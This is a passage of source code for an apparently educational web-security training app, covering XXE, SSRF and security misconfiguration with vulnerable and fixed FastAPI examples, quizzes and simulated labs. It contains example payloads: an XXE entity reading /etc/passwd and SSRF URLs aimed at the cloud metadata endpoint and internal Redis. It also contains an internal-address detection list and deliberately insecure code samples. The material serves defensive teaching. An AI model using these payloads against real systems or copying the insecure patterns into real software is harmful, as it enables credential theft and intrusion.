                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">💥 Remote Code Execution</h4>
                  <p className="text-sm text-slate-300">Possible in some platform/parser combinations</p>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Best Known Methods
              </h3>
              <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                <button onClick={() => setCodeView('comparison')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'comparison' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Before/After Comparison</button>
                <button onClick={() => setCodeView('sidebyside')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'sidebyside' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Side-by-Side View</button>
              </div>
              {codeView === 'comparison' ? (
                <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4 mb-4">
                  <PythonCode code={comparisonCode} />
                </div>
              ) : (
                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-3">❌ BEFORE:</h4>
                    <PythonCode code={vulnerableCode} />
                  </div>
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-3">✅ AFTER:</h4>
                    <PythonCode code={secureCode} />
                  </div>
                </div>
              )}
              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">XXE Defense Checklist:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• <strong>Disable DTDs Entirely:</strong> Most applications never need custom DOCTYPEs</li>
                  <li>• <strong>Disable External Entity Resolution:</strong> resolve_entities=False (or equivalent in your parser)</li>
                  <li>• <strong>Disable Network Access for the Parser:</strong> no_network=True prevents outbound requests</li>
                  <li>• <strong>Prefer JSON:</strong> If you control the format, avoid XML for untrusted input entirely</li>
                  <li>• <strong>Keep XML Libraries Updated:</strong> Some defaults have changed over time to be safer</li>
                </ul>
              </div>
            </div>

            <button onClick={() => { setActiveTab('lab'); onSectionComplete('learn'); }} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
              Continue to Interactive Lab →
            </button>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">🧪 Interactive Lab: XML Import Endpoint</h3>
              <p className="text-slate-300 mb-4">
                This simulates <code className="bg-slate-900 px-2 py-1 rounded">POST /import/xml</code> against a parser with entity
                resolution enabled. Try a normal XML document, then try a DOCTYPE with an external entity.
              </p>
              <div className="bg-slate-900 rounded-lg p-6">
                <label className="block mb-2 font-semibold">XML body:</label>
                <div className="flex gap-3">
                  <input
                    type="text"
                    value={labInput}
                    onChange={(e) => setLabInput(e.target.value)}
                    placeholder={'Try: <note><to>Bob</to></note>  or  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'}
                    className="flex-1 bg-slate-800 border border-slate-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-purple-500 text-sm"
                  />
                  <button onClick={handleLabSubmit} className="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-bold">Parse XML</button>
                </div>
              </div>

              {labResult && (
                <div className={`mt-4 rounded-lg p-4 border ${labResult.safe ? 'bg-green-900/20 border-green-500/50' : 'bg-red-900/20 border-red-500/50'}`}>
                  <p className={`font-bold ${labResult.safe ? 'text-green-400' : 'text-red-400'}`}>{labResult.message}</p>
                  <p className="text-sm text-slate-300 mt-2">{labResult.impact}</p>
                  {labResult.leak && <pre className="bg-slate-950 rounded p-3 mt-3 text-xs text-slate-300 overflow-x-auto whitespace-pre-wrap">{labResult.leak}</pre>}
                </div>
              )}

              <button onClick={() => { setActiveTab('quiz'); onSectionComplete('lab'); }} className="w-full mt-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
                Ready for the Quiz? →
              </button>
            </div>
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz questions={quizQuestions} onComplete={() => onSectionComplete('quiz')} />
          </div>
        )}
      </div>
    </div>
  );
};


// ============================================================================
// SERVER-SIDE REQUEST FORGERY (SSRF) MODULE
// ============================================================================

const SSRFModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');
  const [labInput, setLabInput] = useState('');
  const [labResult, setLabResult] = useState(null);

  const vulnerableCode = `from fastapi import FastAPI
import httpx

app = FastAPI()

@app.get("/fetch-preview")
async def fetch_preview(url: str):
    """⚠️ VULNERABLE - Fetches any URL the client supplies"""
    # DANGEROUS: no validation of scheme or host - the server will
    # happily make a request to internal infrastructure on request
    async with httpx.AsyncClient() as client:
        response = await client.get(url, timeout=5)
    return {"content": response.text[:500]}`;

  const secureCode = `from fastapi import FastAPI, HTTPException
import httpx
import ipaddress
import socket
from urllib.parse import urlparse

app = FastAPI()
ALLOWED_HOSTS = {"images.example-cdn.com", "media.partner-service.com"}

def is_public_ip(host: str) -> bool:
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(host))
        return not (ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved)
    except (socket.gaierror, ValueError):
        return False

@app.get("/fetch-preview")
async def fetch_preview(url: str):
    """✅ SECURE - Allowlists hosts and blocks internal/private IPs"""
    parsed = urlparse(url)

    # SAFE: only https, and only known, trusted hostnames
    if parsed.scheme != "https" or parsed.hostname not in ALLOWED_HOSTS:
        raise HTTPException(400, "URL host is not allowed")

    # SAFE: defense-in-depth - reject anything resolving to a
    # private/internal/loopback/cloud-metadata address
    if not is_public_ip(parsed.hostname):
        raise HTTPException(400, "URL resolves to a disallowed address")

    async with httpx.AsyncClient(follow_redirects=False) as client:
        response = await client.get(url, timeout=5)
    return {"content": response.text[:500]}`;

  const comparisonCode = `from fastapi import FastAPI, HTTPException
import httpx
from urllib.parse import urlparse

app = FastAPI()
ALLOWED_HOSTS = {"images.example-cdn.com", "media.partner-service.com"}

@app.get("/fetch-preview")
async def fetch_preview(url: str):
    """✅ SECURE - Allowlists hosts and blocks internal/private IPs"""
    parsed = urlparse(url)

    # ❌ OLD (VULNERABLE): any url, any scheme, any host, no checks
    # async with httpx.AsyncClient() as client:
    #     response = await client.get(url)

    # ✅ NEW (SECURE): only https + an explicit allowlist of hosts
    if parsed.scheme != "https" or parsed.hostname not in ALLOWED_HOSTS:
        raise HTTPException(400, "URL host is not allowed")

    # ✅ NEW (SECURE): resolve and re-check the actual IP, not just the string
    if not is_public_ip(parsed.hostname):
        raise HTTPException(400, "URL resolves to a disallowed address")

    async with httpx.AsyncClient(follow_redirects=False) as client:
        response = await client.get(url, timeout=5)
    return {"content": response.text[:500]}`;

  const quizQuestions = [
    {
      id: 1,
      question: "What is SSRF?",
      options: [
        "A client-side scripting attack",
        "A vulnerability where an attacker tricks the server into making requests to unintended destinations, often internal-only resources",
        "A type of SQL injection",
        "An attack that only affects file uploads"
      ],
      correct: 1,
      explanation: "SSRF abuses server-side code that fetches a URL on the caller's behalf, redirecting that request toward internal services, cloud metadata endpoints, or other unintended targets."
    },
    {
      id: 2,
      question: "Why is the cloud metadata endpoint (169.254.169.254) a common SSRF target?",
      options: [
        "It's the fastest server to respond",
        "It often exposes temporary cloud credentials to anything on the instance, without authentication",
        "It's the only internal service that exists",
        "It requires a password that's easy to guess"
      ],
      correct: 1,
      explanation: "Cloud providers expose an instance metadata service that, by design, answers unauthenticated requests from the instance itself - including temporary IAM credentials attached to that instance's role."
    },
    {
      id: 3,
      question: "Why is an allowlist of destinations generally better than a denylist of 'bad' hosts?",
      options: [
        "Allowlists are easier to bypass",
        "Denylists are easy to bypass via redirects, DNS rebinding, or alternate IP representations; allowlists only permit known-safe destinations",
        "There's no meaningful difference",
        "Denylists perform better under load"
      ],
      correct: 1,
      explanation: "It's much harder to enumerate every way an attacker might represent 'localhost' or an internal IP than to simply define the small set of destinations the feature actually needs to reach."
    },
    {
      id: 4,
      question: "What additional check helps even after validating the URL string itself?",
      options: [
        "Checking the URL's length",
        "Resolving the hostname and confirming the actual IP isn't private/internal (defense against DNS-based bypasses)",
        "Converting the URL to lowercase",
        "Adding a random query parameter"
      ],
      correct: 1,
      explanation: "A hostname can look legitimate in the string but resolve (or later re-resolve, via DNS rebinding) to a private or loopback address. Checking the resolved IP closes that gap."
    }
  ];

  const handleLabSubmit = () => {
    const input = labInput.trim();
    const lower = input.toLowerCase();
    const internalPatterns = ['localhost', '127.0.0.1', '169.254.169.254', '10.', '192.168.', '172.16.', '172.17.', '172.18.', '172.31.', 'internal', 'file://', 'gopher://'];
    const isInternal = internalPatterns.some(p => lower.includes(p));

    if (isInternal) {
      let leak = '[simulated] connection reached an internal-only service';
      if (lower.includes('169.254.169.254')) {
        leak = '{"AccessKeyId":"ASIA...redacted","SecretAccessKey":"wJalrXUt...redacted","Token":"IQoJb3Jp...redacted"}';
      } else if (lower.includes('6379') || lower.includes('redis')) {
        leak = '# Redis INFO\nredis_version:7.2.4\nrole:master\nconnected_clients:12';
      } else if (lower.includes('admin')) {
        leak = '<html><body><h1>Internal Admin Panel</h1><p>User management, feature flags, and deploy controls</p></body></html>';
      }
      setLabResult({
        safe: false,
        message: "⚠️ SSRF - Internal Resource Reached!",
        impact: "The server made this request on your behalf using its own network position - reaching a destination that isn't exposed to the public internet at all.",
        leak
      });
    } else if (lower.startsWith('https://') && (lower.includes('example-cdn.com') || lower.includes('partner-service.com'))) {
      setLabResult({ safe: true, message: "✅ Allowed Host - Preview Fetched", impact: "This host is on the explicit allowlist and resolves to a public address, so the request proceeds normally.", leak: null });
    } else {
      setLabResult({ safe: true, message: "❌ Blocked - Host Not on Allowlist", impact: "Even though this isn't an internal address, it still isn't one of the explicitly permitted hosts, so a secure implementation would reject it by default.", leak: null });
    }
    onSectionComplete('lab');
  };

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white transition-all">
          <Home className="w-5 h-5" /> Back to Modules
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Globe className="w-10 h-10 text-cyan-400" />
            <h1 className="text-4xl font-bold">Server-Side Request Forgery (SSRF)</h1>
          </div>
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all duration-500" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        </div>

        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Interactive Lab', icon: Terminal },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id ? 'bg-purple-600 text-white shadow-lg' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && <CheckCircle className="w-4 h-4 text-green-400" />}
            </button>
          ))}
        </div>

        {activeTab === 'learn' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding the Vulnerability
              </h3>
              <p className="text-slate-300 mb-4">
                SSRF occurs when an application fetches a URL supplied (directly or indirectly) by the user without restricting where
                that request can go. Because the request originates from the server itself, it can reach internal services, cloud
                metadata endpoints, and other destinations that are never meant to be internet-facing.
              </p>

              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Code Example:</h4>
                <PythonCode code={vulnerableCode} />
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3">Attack Examples - Try These in the Lab:</h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-slate-700">
                        <th className="text-left p-2 text-purple-400">Attack Type</th>
                        <th className="text-left p-2 text-purple-400">Malicious URL</th>
                        <th className="text-left p-2 text-purple-400">Impact</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Internal Service Access</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300 text-xs">http://127.0.0.1:6379/</code></td>
                        <td className="p-2 text-slate-300">Reaches an internal Redis instance not exposed publicly</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Cloud Metadata Theft</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300 text-xs">http://169.254.169.254/latest/meta-data/iam/...</code></td>
                        <td className="p-2 text-slate-300">Steals temporary cloud IAM credentials</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-orange-400">Internal Port Scanning</td>
                        <td className="p-2 text-slate-300">Repeated requests to http://10.0.0.X:PORT, timing responses</td>
                        <td className="p-2 text-slate-300">Maps internal hosts/ports from outside the network</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold text-orange-400">DNS Rebinding Bypass</td>
                        <td className="p-2 text-slate-300">URL resolves to a public IP at check-time, then to an internal one at fetch-time</td>
                        <td className="p-2 text-slate-300">Bypasses a naive one-time allowlist check</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Impact
              </h3>
              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">🔑 Cloud Credential Theft</h4>
                  <p className="text-sm text-slate-300">Instance metadata endpoints leak temporary IAM credentials</p>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">🕵️ Internal Reconnaissance</h4>
                  <p className="text-sm text-slate-300">Maps out and probes hosts on the internal network</p>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">🛠️ Internal Admin Access</h4>
                  <p className="text-sm text-slate-300">Reaches admin panels/databases never meant to be public</p>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">🧱 Firewall Bypass</h4>
                  <p className="text-sm text-slate-300">The server itself becomes the attacker's proxy past network defenses</p>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Best Known Methods
              </h3>
              <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                <button onClick={() => setCodeView('comparison')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'comparison' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Before/After Comparison</button>
                <button onClick={() => setCodeView('sidebyside')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'sidebyside' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Side-by-Side View</button>
              </div>
              {codeView === 'comparison' ? (
                <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4 mb-4">
                  <PythonCode code={comparisonCode} />
                </div>
              ) : (
                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-3">❌ BEFORE:</h4>
                    <PythonCode code={vulnerableCode} />
                  </div>
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-3">✅ AFTER:</h4>
                    <PythonCode code={secureCode} />
                  </div>
                </div>
              )}
              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">SSRF Defense Checklist:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• <strong>Allowlist Destinations:</strong> Only permit requests to specific, known-safe hosts</li>
                  <li>• <strong>Validate the Resolved IP:</strong> Reject private, loopback, link-local, and reserved ranges</li>
                  <li>• <strong>Disable Redirects (or Re-Validate After Them):</strong> Prevent allowlist bypass via redirect chains</li>
                  <li>• <strong>Restrict Schemes:</strong> Only allow https - block file://, gopher://, and similar</li>
                  <li>• <strong>Network Segmentation:</strong> Ensure internal services still require their own authentication as defense-in-depth</li>
                </ul>
              </div>
            </div>

            <button onClick={() => { setActiveTab('lab'); onSectionComplete('learn'); }} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
              Continue to Interactive Lab →
            </button>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">🧪 Interactive Lab: URL Preview Fetcher</h3>
              <p className="text-slate-300 mb-4">
                This simulates <code className="bg-slate-900 px-2 py-1 rounded">GET /fetch-preview?url=...</code> with no destination
                validation. Try a normal external URL, then try pointing it at an internal address.
              </p>
              <div className="bg-slate-900 rounded-lg p-6">
                <label className="block mb-2 font-semibold">url:</label>
                <div className="flex gap-3">
                  <input
                    type="text"
                    value={labInput}
                    onChange={(e) => setLabInput(e.target.value)}
                    placeholder="Try: https://images.example-cdn.com/photo.jpg or http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                    className="flex-1 bg-slate-800 border border-slate-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-purple-500 text-sm"
                  />
                  <button onClick={handleLabSubmit} className="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-bold">Fetch</button>
                </div>
              </div>

              {labResult && (
                <div className={`mt-4 rounded-lg p-4 border ${labResult.safe ? 'bg-green-900/20 border-green-500/50' : 'bg-red-900/20 border-red-500/50'}`}>
                  <p className={`font-bold ${labResult.safe ? 'text-green-400' : 'text-red-400'}`}>{labResult.message}</p>
                  <p className="text-sm text-slate-300 mt-2">{labResult.impact}</p>
                  {labResult.leak && <pre className="bg-slate-950 rounded p-3 mt-3 text-xs text-slate-300 overflow-x-auto whitespace-pre-wrap">{labResult.leak}</pre>}
                </div>
              )}

              <button onClick={() => { setActiveTab('quiz'); onSectionComplete('lab'); }} className="w-full mt-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
                Ready for the Quiz? →
              </button>
            </div>
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz questions={quizQuestions} onComplete={() => onSectionComplete('quiz')} />
          </div>
        )}
      </div>
    </div>
  );
};


// ============================================================================
// SECURITY MISCONFIGURATION MODULE
// ============================================================================

const SecurityMisconfigModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');
  const [debugMode, setDebugMode] = useState(true);
  const [wildcardCors, setWildcardCors] = useState(true);
  const [adminAuth, setAdminAuth] = useState(false);
  const [defaultCreds, setDefaultCreds] = useState(true);
  const [scanResult, setScanResult] = useState(null);

  const vulnerableCode = `from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

# DANGEROUS: debug mode leaks stack traces & internals to clients
app = FastAPI(debug=True)

# DANGEROUS: wildcard CORS lets ANY website call this API with
# credentials, bypassing the same-origin policy entirely
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/admin/db-status")
async def db_status():
    # DANGEROUS: no authentication on an internal diagnostics route
    return {"db_host": "prod-db-01.internal", "version": "PostgreSQL 14.2"}`;

  const secureCode = `from fastapi import FastAPI, Depends
from fastapi.middleware.cors import CORSMiddleware
import os

# SAFE: debug disabled outside local development
app = FastAPI(debug=os.getenv("ENV") == "development")

# SAFE: explicit, minimal allowlist of trusted origins
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://app.example.com"],
    allow_credentials=True,
    allow_methods=["GET", "POST"],
    allow_headers=["Authorization", "Content-Type"],
)

@app.get("/admin/db-status")
async def db_status(admin_user=Depends(require_admin_role)):
    """✅ SECURE - Requires authenticated admin, returns minimal info"""
    return {"status": "healthy"}`;

  const comparisonCode = `from fastapi import FastAPI, Depends
from fastapi.middleware.cors import CORSMiddleware
import os

# ❌ OLD (VULNERABLE): app = FastAPI(debug=True)
# ✅ NEW (SECURE): only enable debug locally
app = FastAPI(debug=os.getenv("ENV") == "development")

# ❌ OLD (VULNERABLE): allow_origins=["*"], allow_credentials=True
# ✅ NEW (SECURE): explicit allowlist of trusted origins only
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://app.example.com"],
    allow_credentials=True,
    allow_methods=["GET", "POST"],
)

@app.get("/admin/db-status")
async def db_status(admin_user=Depends(require_admin_role)):
    # ❌ OLD (VULNERABLE): no authentication, verbose internal details
    # ✅ NEW (SECURE): requires admin auth, returns minimal info
    return {"status": "healthy"}`;

  const quizQuestions = [
    {
      id: 1,
      question: "Why is allow_origins=[\"*\"] combined with allow_credentials=True dangerous?",
      options: [
        "It slows down every request",
        "It lets any website make authenticated requests using a victim's session cookies from their own browser",
        "It disables HTTPS",
        "It only affects requests from search engines"
      ],
      correct: 1,
      explanation: "Wildcard CORS with credentials effectively tells browsers it's fine for any origin to make authenticated cross-origin requests - defeating the same-origin policy protections credentials rely on."
    },
    {
      id: 2,
      question: "What does leaving debug mode / stack traces enabled in production expose?",
      options: [
        "Nothing of concern",
        "Internal file paths, library versions, and sometimes secrets or logic that help attackers craft further attacks",
        "Only CSS styling issues",
        "The user's own browser history"
      ],
      correct: 1,
      explanation: "Verbose error pages hand attackers a roadmap: exact file paths, framework/library versions (useful for looking up known CVEs), and sometimes even fragments of source code or configuration."
    },
    {
      id: 3,
      question: "What's the core principle behind fixing security misconfiguration?",
      options: [
        "Add more logging everywhere",
        "Secure-by-default hardening: disable what you don't need, restrict what remains, and never ship development settings to production",
        "Rename all internal endpoints",
        "Increase server timeouts"
      ],
      correct: 1,
      explanation: "Misconfiguration is rarely one bug - it's an accumulation of defaults and conveniences left over from development. The fix is a deliberate hardening pass, not a single patch."
    },
    {
      id: 4,
      question: "Why are unauthenticated internal/admin/diagnostic endpoints risky even if their URL is 'hidden'?",
      options: [
        "They aren't risky if nobody knows the URL",
        "Security through obscurity isn't security - anyone who discovers or guesses the URL gets full, unauthenticated access",
        "They're only accessible from inside the office",
        "Search engines never index any URLs"
      ],
      correct: 1,
      explanation: "Unlinked endpoints still get discovered - through scanners, leaked documentation, JavaScript bundles, or simple guessing. Authentication needs to be enforced by the server, not by obscurity."
    }
  ];

  const runScan = () => {
    const findings = [];
    if (debugMode) findings.push({ severity: 'Critical', text: 'Debug mode is ON in production - stack traces, file paths, and internal details are exposed to any client that triggers an error.' });
    if (wildcardCors) findings.push({ severity: 'Critical', text: 'CORS allows any origin (*) with credentials enabled - any website can make authenticated requests using a logged-in visitor\'s session.' });
    if (!adminAuth) findings.push({ severity: 'Critical', text: 'The /admin/db-status route has no authentication - anyone who finds the URL gets internal infrastructure details.' });
    if (defaultCreds) findings.push({ severity: 'High', text: 'Default credentials have not been changed on the database/admin panel - instant unauthorized access using publicly known defaults.' });

    setScanResult({ safe: findings.length === 0, findings });
    onSectionComplete('lab');
  };

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white transition-all">
          <Home className="w-5 h-5" /> Back to Modules
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Settings className="w-10 h-10 text-gray-400" />
            <h1 className="text-4xl font-bold">Security Misconfiguration</h1>
          </div>
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all duration-500" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        </div>

        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Interactive Lab', icon: Terminal },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id ? 'bg-purple-600 text-white shadow-lg' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && <CheckCircle className="w-4 h-4 text-green-400" />}
            </button>
          ))}
        </div>

        {activeTab === 'learn' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding the Vulnerability
              </h3>
              <p className="text-slate-300 mb-4">
                Security misconfiguration covers the accumulation of insecure defaults, unnecessary features, and development-only
                settings that get shipped to production - permissive CORS, debug mode, unauthenticated internal routes, default
                credentials, and verbose error messages among them.
              </p>

              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Code Example:</h4>
                <PythonCode code={vulnerableCode} />
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3">Common Misconfigurations - Try Toggling These in the Lab:</h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-slate-700">
                        <th className="text-left p-2 text-purple-400">Misconfiguration</th>
                        <th className="text-left p-2 text-purple-400">Example</th>
                        <th className="text-left p-2 text-purple-400">Impact</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Wildcard CORS + Credentials</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300 text-xs">allow_origins=["*"]</code></td>
                        <td className="p-2 text-slate-300">Any site can make authenticated requests as the victim</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Debug Mode in Production</td>
                        <td className="p-2 text-slate-300">FastAPI(debug=True) left on after deployment</td>
                        <td className="p-2 text-slate-300">Stack traces reveal paths, versions, internal logic</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-orange-400">Unauthenticated Admin Routes</td>
                        <td className="p-2 text-slate-300">/admin/db-status with no auth dependency</td>
                        <td className="p-2 text-slate-300">Exposes internal architecture to anyone who finds it</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold text-orange-400">Default Credentials</td>
                        <td className="p-2 text-slate-300">admin/admin left unchanged on a database or panel</td>
                        <td className="p-2 text-slate-300">Instant unauthorized access using public defaults</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Impact
              </h3>
              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">🌐 Full Data Exposure via CORS</h4>
                  <p className="text-sm text-slate-300">Permissive CORS lets any origin read authenticated responses</p>
                </div>
